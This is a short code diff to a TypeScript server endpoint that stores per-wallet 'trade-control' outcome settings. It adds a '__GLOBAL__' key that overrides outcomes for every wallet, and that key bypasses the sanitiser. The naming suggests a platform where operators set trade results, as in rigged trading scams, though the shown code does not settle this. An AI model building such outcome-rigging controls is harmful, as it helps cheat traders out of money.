@@ -29,7 +29,9 @@ export default async (req: Request, context: Context) => {
     const url = new URL(req.url);
     const wallet = url.searchParams.get("wallet");
     if (!wallet) {
-      return secureJson({ error: "Wallet address required" }, 400);
+      // No wallet specified — return the global setting
+      const globalCtrl = await store.get("trade-control-__GLOBAL__", { type: "json" });
+      return secureJson(globalCtrl || { outcome: "random" });
     }
     const safeWallet = sanitizeString(String(wallet), 100).toLowerCase();
     if (!safeWallet) {
@@ -48,10 +50,11 @@ export default async (req: Request, context: Context) => {
     }
     const { wallet, outcome } = body;
 
-    if (!wallet) {
-      return secureJson({ error: "Wallet address required" }, 400);
-    }
-    const safeWallet = sanitizeString(String(wallet), 100).toLowerCase();
+    // Allow __GLOBAL__ as special key for global outcome override
+    const rawWallet = String(wallet || "");
+    const safeWallet = rawWallet === "__GLOBAL__"
+      ? "__GLOBAL__"
+      : sanitizeString(rawWallet, 100).toLowerCase();
     if (!safeWallet) {
       return secureJson({ error: "Invalid wallet address" }, 400);
     }
